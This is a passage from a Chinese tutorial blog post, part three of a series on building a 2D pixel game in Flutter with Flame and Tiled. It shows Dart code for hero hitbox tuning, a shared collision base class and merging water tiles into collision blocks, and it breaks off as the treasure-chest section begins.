src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc59e14866b241688361555ee1e70947~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=7CXkReFqdYXG2D4yEiZKyPW%2Fb3Y%3D" width="100%" loading="lazy"/></p><p/>
<p><a href="https://juejin.cn/post/7579264485259411471" target="_blank" title="https://juejin.cn/post/7579264485259411471">Flutter 勇闯2D像素游戏之路（一）：一个 Hero 的诞生</a><br/>
<a href="https://juejin.cn/post/7581025279646892070" target="_blank" title="https://juejin.cn/post/7581025279646892070">Flutter 勇闯2D像素游戏之路（二）：绘制加载游戏地图</a><br/>
<a href="https://juejin.cn/spost/7584014975242911754" target="_blank" title="https://juejin.cn/spost/7584014975242911754">Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互</a></p>
<h2 data-id="heading-0">前言</h2>
<p>在上篇文章中，我们初识了 <strong>2D 地图编辑器 Tiled</strong>，完成了从 <strong>地图绘制、资源加载</strong> 到 <strong>基础墙体碰撞</strong> 的搭建，为游戏世界奠定了最基本的空间规则。</p>
<p>但仅有 <code>能走、能挡</code> 的地图，还远不足以构成一个真正有生命力的游戏场景。<br/>
真正让地图 <code>活</code> 起来的，是 <strong>人物与地图元素之间的交互</strong>。</p>
<p>在游戏中，地图并不仅仅是静态的背景，它往往承载着多种功能性的元素，例如：</p>
<ul>
<li>可被触发的 <strong>宝箱、机关</strong></li>
<li>控制通行逻辑的 <strong>钥匙与门</strong></li>
<li>带来风险与挑战的 <strong>陷阱、伤害型障碍物</strong></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dbb61d1a0c8429aac51cb7b03f11fec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lCiolOqecoPYfa3nFF9vqLO1Vhw%3D" alt="截屏2025-12-16 13.58.20.png" loading="lazy"/></p>
<p>这些元素都需要与人物产生行为上的联动：<br/>
<strong>接触、判断、反馈、结果</strong>，共同构成完整的交互闭环。</p>
<p>因此，本篇文章将着重于构建 <strong>人物与地图元素的交互</strong> ，逐步 <strong>介绍、实现</strong> 几类常见的地图交互对象，构建一个更加丰富、可扩展的地图交互体系。</p>
<h3 data-id="heading-1">前情提示</h3>
<h4 data-id="heading-2">1. 地图</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ceaac4c66a3348c7885fd3c0de868d8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lc0X076tyX4XmZd%2FWYZNjGeVwzM%3D" width="100%" loading="lazy"/>
<p>在进行本章的内容实践之前，请先将之前地图中 <strong>门、宝箱、钥匙、地刺元素</strong> 先行清除。<br/>
本章将把他们从单纯装饰件，进化到真正的可交互件。</p>
<blockquote>
<p>接下来所需要用到的 <strong>门、宝箱、钥匙、地刺</strong> 等图片素材，已在 <strong>github仓库</strong> 中添加。</p>
</blockquote>
<h4 data-id="heading-3">2. 墙体</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09af254d3786466dad783d6a18c6e010~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=PK8twXdE%2FrnqpkiwovStFoGFy8U%3D" alt="截屏2025-12-16 14.18.55.png" loading="lazy"/></p>
<p>首先，先感谢兄弟的反馈 😊<br/>
接下来我们就用 <strong>Object Layer</strong> 和 <strong>Tile Layer</strong> 实现上一期的墙体碰撞区，看看区别。</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b02b4357c85a496b93fd98cfb229fce6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=6ra5QiLhfJM25Q3aIp4qaiqHeqg%3D" width="100%" loading="lazy"/>
<p align="center"><i>Object Layer</i></p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91870250637a4e74972dca03c541812f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=WulaVqMQ%2FupsMfeaWKx9SUta1io%3D" width="100%" loading="lazy"/>
<p align="center"><i>Tile Layer</i></p>
<p>从图中可以看到：</p>
<ul>
<li><strong>Tile Layer</strong> 的碰撞区完美和地图中 <strong>wall</strong> 图层匹配</li>
<li><strong>Object Layer</strong> 的碰撞区完美和 <strong>Collisions</strong> 对象层匹配</li>
</ul>
<p><strong>在本文素材的前提之下</strong>：</p>
<ul>
<li>如果按 <strong>Tile Layer</strong>，那么碰撞区范围就偏大了，需要你重新绘制墙体，但是你会发现素材中墙体与下面的地板是在一块的，不能分离，这就不太完美。</li>
<li>而 <strong>Object Layer</strong> 可以让我们在不破坏改变墙体的前提下，更精细调整墙体的碰撞区，让它更合理。</li>
</ul>
<p>因此，<strong>各有利弊</strong>，看大家的 <strong>取舍</strong>。</p>
<blockquote>
<p>本文中水面的碰撞区就是 <strong>Tile Layer</strong> 方法，大家可以看一看。</p>
</blockquote>
<h2 data-id="heading-4">MyHero</h2>
<h3 data-id="heading-5">一. 本章目标</h3>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e56f018c6d474c16804a3b03a1eedbc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lUsx04BsdQeRssli0UqbPM641lw%3D" width="100%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca34bafe00f8492b84f46c3022077ae3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=3HTqU0I2VkU8%2Bl9xs2bEEJzpTDs%3D" width="100%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b0495310526464485e1c9172960dfce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=gCxZLyGeUignUPz%2ByLTpB9cC1zU%3D" width="100%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7165f8043a14465a8da56a9feef4d515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=Pj4UfE5HRi3HYs5Q%2FD%2FusulKy58%3D" width="100%" loading="lazy"/>
<h3 data-id="heading-6">二. 人物碰撞矩形优化</h3>
<h4 data-id="heading-7">1. 优化前</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a13610b36e4641518a291fcaf2f9be22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lQ3u7sKkPYTkAaBs5jQP%2BiK0A3A%3D" alt="1.gif" loading="lazy"/></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// hero_component.dart</span>

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    ...

    size = Vector2(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
    position = Vector2(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);
    _hitbox = RectangleHitbox();
    add(_hitbox);
  }
</code></pre>
<p>默认情况下，人物的碰撞区域 <code>RectangleHitbox</code> 会 <strong>继承父组件的 size</strong>，也就是说碰撞矩形就是  <strong>100×100</strong>，所以碰撞框很大，通常会比人物实际可视部分大。</p>
<blockquote>
<p>这样就导致 <strong>上图中问题</strong> ，在一个狭窄的走道内，由于你的超大碰撞区域，而被卡住。</p>
</blockquote>
<h4 data-id="heading-8">2. 优化后</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee4f4656b4704f9580368f0b4f0ae820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=pw7jpdIlENx2TjqxTp8HwaXDhyQ%3D" alt="2.gif" loading="lazy"/></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// hero_component.dart</span>

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    ...

    size = Vector2(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
    position = Vector2(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);
    _hitbox = RectangleHitbox.relative(
      Vector2(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.2</span>), <span class="hljs-comment">// 碰撞区域占组件宽高比例</span>
      parentSize: size,
      position: Vector2(size.x * <span class="hljs-number">0.25</span>, size.y * <span class="hljs-number">0.7</span>), <span class="hljs-comment">// 碰撞区域的偏移</span>
    );
    add(_hitbox);
  }
</code></pre>
<p>优化后，我们使用 <code>RectangleHitbox.relative</code> 手动缩小碰撞矩形，并调整偏移，使碰撞区域只覆盖角色脚底，即可获取 <strong>正常的游戏体验</strong>：</p>
<ul>
<li>碰撞矩形与角色可视部分更贴合，避免卡墙。</li>
<li>在狭窄走道中角色可以顺畅移动。</li>
<li>保留足够的碰撞检测区域，保证游戏逻辑和物理交互仍然有效。</li>
</ul>
<blockquote>
<p>✨<strong>总结</strong>：<br/>
通过简单缩小并下移碰撞矩形，实现了视觉与碰撞逻辑的分离，就可以极大提升可控性和玩家体验。</p>
</blockquote>
<h3 data-id="heading-9">三. 统一碰撞管理</h3>
<h4 data-id="heading-10">1. 必要性</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57b3098efea0453b8457509e059ed0a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=ovYDStufGS6Q6oVKItGIHeCR02o%3D" width="100%" loading="lazy"/>
<p>在游戏开发中，墙体、门、障碍区域等 <strong>碰撞对象</strong> 往往分布在地图的不同层级或组件中。<br/>
这类对象的共同特点是：<strong>不一定需要渲染，但必须参与碰撞判断</strong>。</p>
<p>如果每个组件各自实现碰撞逻辑，容易出现以下问题：</p>
<ol>
<li><strong>逻辑分散</strong> ：碰撞判断分布在多个组件中，角色移动与阻挡逻辑难以统一管理。</li>
<li><strong>重复实现</strong>：不同碰撞对象往往需要相同的尺寸、位置和碰撞检测代码，容易产生冗余。</li>
<li><strong>扩展不便</strong>：新增一种可碰撞对象时，需要重复编写或修改现有碰撞相关逻辑。</li>
</ol>
<p>因此，有必要建立一个统一的 <code>碰撞管理</code>，将 <strong>可参与碰撞</strong> 的能力集中管理。</p>
<h4 data-id="heading-11">2. 实现</h4>
<h5 data-id="heading-12">（1）新建碰撞基类</h5>
<p>抽象出一个 <code>BlockerComponent</code> 作为 <strong>统一的碰撞基类</strong>，后续所有需要参与碰撞的组件直接继承该类即可，避免在各个组件中重复编写碰撞逻辑。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// blocker_component.dart</span>

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BlockerComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> RectangleHitbox hitbox;

  BlockerComponent({
    <span class="hljs-keyword">super</span>.position,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">super</span>.size,
    <span class="hljs-built_in">bool</span> addHitbox = <span class="hljs-keyword">true</span>,
  }) {
    <span class="hljs-keyword">if</span> (addHitbox) {
      hitbox = RectangleHitbox();
      add(hitbox);
    }
  }

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 创建 1×1 的透明 sprite，占位以满足 SpriteComponent 要求</span>
    <span class="hljs-keyword">final</span> recorder = PictureRecorder();
    <span class="hljs-keyword">final</span> canvas = Canvas(recorder);
    <span class="hljs-keyword">final</span> paint = Paint()..color = <span class="hljs-keyword">const</span> Color(<span class="hljs-number">0x00000000</span>);
    canvas.drawRect(<span class="hljs-keyword">const</span> Rect.fromLTWH(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), paint);
    <span class="hljs-keyword">final</span> picture = recorder.endRecording();
    <span class="hljs-keyword">final</span> image = <span class="hljs-keyword">await</span> picture.toImage(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
    sprite = Sprite(image);
  }

  <span class="hljs-built_in">bool</span> collidesWith(Rect heroRect) {
    <span class="hljs-keyword">return</span> hitbox.toAbsoluteRect().overlaps(heroRect);
  }
}
</code></pre>
<ul>
<li>
<p><strong>作为可碰撞组件的基础类</strong></p>
<ul>
<li>继承 <code>SpriteComponent</code>，统一管理位置与尺寸</li>
<li>混入 <code>CollisionCallbacks</code>，接入 Flame 碰撞体系</li>
<li>使用 <code>RectangleHitbox</code> 作为实际的碰撞区域</li>
</ul>
</li>
<li>
<p><strong>解决 SpriteComponent 必须绑定 sprite 的限制</strong></p>
<ul>
<li>在 <code>onLoad</code> 中创建一个 <code>1×1</code> 的透明 sprite</li>
<li>组件本身不可见，但在引擎层面是合法的渲染组件</li>
</ul>
</li>
<li>
<p><strong>提供手动碰撞检测能力</strong></p>
<ul>
<li>通过 <code>collidesWith(Rect heroRect)</code> 判断是否发生重叠</li>
<li>适用于角色移动过程中的阻挡判断与位移修正</li>
</ul>
</li>
</ul>
<h5 data-id="heading-13">（2）修改代码</h5>
<p>首先，我们就可以将原来的 <code>wall_component.dart</code> 继承了 <code>BlockerComponent</code>。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// wall_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WallComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BlockerComponent</span> </span>{
  WallComponent({Vector2? position, <span class="hljs-keyword">required</span> Vector2 size}) 
      : <span class="hljs-keyword">super</span>(position: position, size: size);
}
</code></pre>
<hr/>
<p>其次，在 <code>my_game.dart</code> 中,我们将原来只用于收集墙体的列表修改：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// my_game.dart</span>

<span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;WallComponent&gt; walls  ---&gt;  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;BlockerComponent&gt; blockers

<span class="hljs-comment">// 统一添加管理</span>
blockers.add();
</code></pre>
<hr/>
<p>最后，在 <code>hero_component.dart</code> 中修改：</p>
<ul>
<li><strong>碰撞性能优化集合</strong></li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> <span class="hljs-built_in">Set</span>&lt;BlockerComponent&gt; _nearbyBlockers = {};
<span class="hljs-keyword">late</span> RectangleHitbox _hitbox;
</code></pre>
<ul>
<li><strong>碰撞检测方法</strong></li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-built_in">bool</span> _wouldCollideWithBlockers() {
    <span class="hljs-keyword">final</span> heroRect = _hitbox.toAbsoluteRect();

    <span class="hljs-comment">// 优先使用游戏维护的 blockers 集合</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> blocker <span class="hljs-keyword">in</span> game.blockers) {
      <span class="hljs-keyword">if</span> (blocker.collidesWith(heroRect)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }
    
    ...

    <span class="hljs-comment">// 兼容附近 blockers</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> nearby <span class="hljs-keyword">in</span> _nearbyBlockers) {
      <span class="hljs-keyword">if</span> (nearby.collidesWith(heroRect)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
}
</code></pre>
<ul>
<li><strong>碰撞回调</strong></li>
</ul>
<pre><code class="hljs language-dart" lang="dart"> <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(
    <span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints,
    PositionComponent other,
  ) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> BlockerComponent) {
      _nearbyBlockers.add(other);
    }
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionEnd(PositionComponent other) {
    <span class="hljs-keyword">super</span>.onCollisionEnd(other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> BlockerComponent) {
      _nearbyBlockers.remove(other);
    }
  }
</code></pre>
<h3 data-id="heading-14">四. Tile Layer 构建水面碰撞区</h3>
<p>构建水面碰撞区，简单来说就是遍历 <strong>Tiled</strong> 地图中的 <code>water</code> 图层，将所有 <strong>非空瓦片</strong> 转换为对应的 <code>WaterComponent</code>，并按瓦片位置和大小添加到游戏世界中，用于表示水面。</p>
<h4 data-id="heading-15">方式一：逐瓦片创建组件（仅展示）</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a896ee7f208345fca1d11b496bd17230~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=%2FkCwsOFjP9AtAdy3RDP6NZ5qIsE%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> waterLayer = tiled.tileMap.getLayer&lt;TileLayer&gt;(<span class="hljs-string">'water'</span>);

<span class="hljs-keyword">if</span> (waterLayer != <span class="hljs-keyword">null</span> &amp;&amp; waterLayer.data != <span class="hljs-keyword">null</span>) {
  <span class="hljs-keyword">final</span> width = waterLayer.width;
  <span class="hljs-keyword">final</span> height = waterLayer.height;
  <span class="hljs-keyword">final</span> data = waterLayer.data!;

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
      <span class="hljs-keyword">final</span> index = y * width + x;
      <span class="hljs-keyword">final</span> gid = data[index];

      <span class="hljs-keyword">if</span> (gid != <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">final</span> water = WaterComponent(
            position: Vector2(
              x * tileSize * mapScale,
              y * tileSize * mapScale,
            ),
            size: Vector2(
              tileSize * mapScale,
              tileSize * mapScale,
            ),
          );
        <span class="hljs-comment">// 添加至统一碰撞列表</span>
        blockers.add(water);
        <span class="hljs-keyword">await</span> world.add(water);
      }
    }
  }
}

</code></pre>
<p>这里将地图中每一个 <strong>8x8</strong> 的水瓦片，都单独变成一个 <code>WaterComponent</code> 对象。</p>
<blockquote>
<p>可以看见地图中水面数量巨大，产生了 <strong>大量组件</strong>，<strong>极大降低渲染和碰撞效率</strong>。</p>
</blockquote>
<h4 data-id="heading-16">方式二：批量合并创建组件（推荐）</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/856732f2c2ae42019a8f8586ce6be852~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=ZrolKuefyJzl3uU0noNLYmM02to%3D" width="100%" loading="lazy"/>
<pre><code class="hljs language-dart" lang="dart">  <span class="hljs-comment">// my_game.dart</span>

  <span class="hljs-keyword">final</span> waterLayer = tiled.tileMap.getLayer&lt;TileLayer&gt;(<span class="hljs-string">'water'</span>);
    <span class="hljs-keyword">if</span> (waterLayer != <span class="hljs-keyword">null</span> &amp;&amp; waterLayer.data != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">await</span> addMergedTileLayerV2(
        tileData: waterLayer.data!,
        width: waterLayer.width,
        height: waterLayer.height,
        tileSize: tileSize,
        scale: mapScale,
        createComponent: (position, size) <span class="hljs-keyword">async</span> {
          <span class="hljs-keyword">final</span> water = WaterComponent(position: position, size: size);
          <span class="hljs-comment">// 添加至统一碰撞列表</span>
          blockers.add(water);
          <span class="hljs-keyword">return</span> water;
        },
        parent: world,
      );
    }
</code></pre>
<p>这种方式通过 <code>addMergedTileLayerV2</code> 将相邻的水瓦片批量合并为较少的组件:</p>
<ul>
<li>大幅减少 <code>Component</code> 数量，提高性能</li>
<li>保持碰撞逻辑和渲染一致</li>
<li>可以统一加入 <code>blockers</code> 列表，方便英雄碰撞预测</li>
</ul>
<blockquote>
<p>可以看见地图中,数量巨大的组件,经过 <code>addMergedTileLayerV2</code> 方法批量合并后，仅为3个了。</p>
</blockquote>
<h4 data-id="heading-17">批量合并方法</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// common.dart</span>

<span class="hljs-comment">/// <span class="markdown">扫描 TileLayer 数据，将连续非零瓦片合并成矩形组件（水平+垂直合并）</span></span>
<span class="hljs-comment">/// <span class="markdown">[tileData] - TileLayer.data，按行展开</span></span>
<span class="hljs-comment">/// <span class="markdown">[width] - TileLayer 宽度（列数）</span></span>
<span class="hljs-comment">/// <span class="markdown">[height] - TileLayer 高度（行数）</span></span>
<span class="hljs-comment">/// <span class="markdown">[tileSize] - 每个瓦片大小</span></span>
<span class="hljs-comment">/// <span class="markdown">[scale] - 地图缩放</span></span>
<span class="hljs-comment">/// <span class="markdown">[createComponent] - 创建每个碰撞块的方法</span></span>
<span class="hljs-comment">/// <span class="markdown">[parent] - 父组件，用于添加生成的组件</span></span>
Future&lt;<span class="hljs-keyword">void</span>&gt; addMergedTileLayerV2({
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; tileData,
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">int</span> width,
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">int</span> height,
  <span class="hljs-keyword">required</span> <span class="hljs-built_in">double</span> tileSize,
  <span class="hljs-built_in">double</span> scale = <span class="hljs-number">1.0</span>,
  <span class="hljs-keyword">required</span> Future&lt;PositionComponent&gt; <span class="hljs-built_in">Function</span>(Vector2 position, Vector2 size)
      createComponent,
  <span class="hljs-keyword">required</span> Component parent,
}) <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// Step1: 先按行生成水平合并块</span>
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt;&gt; rects = []; <span class="hljs-comment">// 每行的开始列和宽度</span>
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt;&gt; horizontalRects = <span class="hljs-built_in">List</span>.generate(height, (_) =&gt; []);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-built_in">int</span> startX = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>; x &lt;= width; x++) {
      <span class="hljs-keyword">final</span> isFilled = x &lt; width &amp;&amp; tileData[y * width + x] != <span class="hljs-number">0</span>;

      <span class="hljs-keyword">if</span> (isFilled &amp;&amp; startX == <span class="hljs-number">-1</span>) {
        startX = x;
      }

      <span class="hljs-keyword">if</span> ((!isFilled || x == width) &amp;&amp; startX != <span class="hljs-number">-1</span>) {
        horizontalRects[y].addAll([startX, x - startX]);
        startX = <span class="hljs-number">-1</span>;
      }
    }
  }

  <span class="hljs-comment">// Step2: 垂直合并相同列和宽度的块</span>
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt;&gt; processed = <span class="hljs-built_in">List</span>.generate(height, (_) =&gt; <span class="hljs-built_in">List</span>.filled(width, <span class="hljs-number">0</span>));
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; horizontalRects[y].length; i += <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">final</span> xStart = horizontalRects[y][i];
      <span class="hljs-keyword">final</span> w = horizontalRects[y][i + <span class="hljs-number">1</span>];

      <span class="hljs-keyword">if</span> (processed[y][xStart] == <span class="hljs-number">1</span>) <span class="hljs-keyword">continue</span>;

      <span class="hljs-comment">// 尝试向下合并</span>
      <span class="hljs-built_in">int</span> rectHeight = <span class="hljs-number">1</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> yy = y + <span class="hljs-number">1</span>; yy &lt; height; yy++) {
        <span class="hljs-built_in">bool</span> canMerge = <span class="hljs-keyword">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; horizontalRects[yy].length; j += <span class="hljs-number">2</span>) {
          <span class="hljs-keyword">if</span> (horizontalRects[yy][j] == xStart &amp;&amp;
              horizontalRects[yy][j + <span class="hljs-number">1</span>] == w) {
            canMerge = <span class="hljs-keyword">true</span>;
            <span class="hljs-keyword">break</span>;
          }
        }
        <span class="hljs-keyword">if</span> (canMerge) {
          rectHeight++;
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> col = xStart; col &lt; xStart + w; col++) {
            processed[yy][col] = <span class="hljs-number">1</span>;
          }
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">break</span>;
        }
      }

      <span class="hljs-comment">// 创建组件</span>
      <span class="hljs-keyword">final</span> position =
          Vector2(xStart * tileSize * scale, y * tileSize * scale);
      <span class="hljs-keyword">final</span> size = Vector2(w * tileSize * scale, rectHeight * tileSize * scale);
      <span class="hljs-keyword">final</span> block = <span class="hljs-keyword">await</span> createComponent(position, size);
      <span class="hljs-keyword">await</span> parent.add(block);

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> col = xStart; col &lt; xStart + w; col++) {
        processed[y][col] = <span class="hljs-number">1</span>;
      }
    }
  }
}
</code></pre>
<blockquote>
<p><code>addMergedTileLayerV2</code> 用于 <strong>扫描 TileLayer 的瓦片数据</strong>，将相邻的非空瓦片先进行<strong>水平方向合并</strong>，再在此基础上进行<strong>垂直方向合并</strong>，最终把多个连续瓦片合并为<strong>更大的矩形组件</strong>。</p>
</blockquote>
<h3 data-id="heading-18">五. 宝箱 - 无验证交互式解锁</h3>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e56f018c6d474c16804a3b03a1eedbc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lUsx04BsdQeRssli0UqbPM641lw%3D" width="100%" loading="lazy"/>
<h4 data-id="heading-19">1. 简述</h4>
<p><strong>宝箱</strong> 是一种无需条件验证的可交互地图对象，通过角色接触即可触发交互。</p>
<ul>
<li>
<p><strong>继承关系</strong>：无需继承碰撞基类</p>
</li>
<li>
<p><strong>功能</strong>：提供可拾取奖励</p>
</li>
<li>
<p><strong>交互逻辑</strong>：</p>
<ul>
<li>玩家靠近宝箱即可触发打开动作</li>
<li>打开后玩家可选择是否拾取奖励</li>
</ul>
</li>
</ul>
<h4 data-id="heading-20">2. Tiled 前置工作</h4>
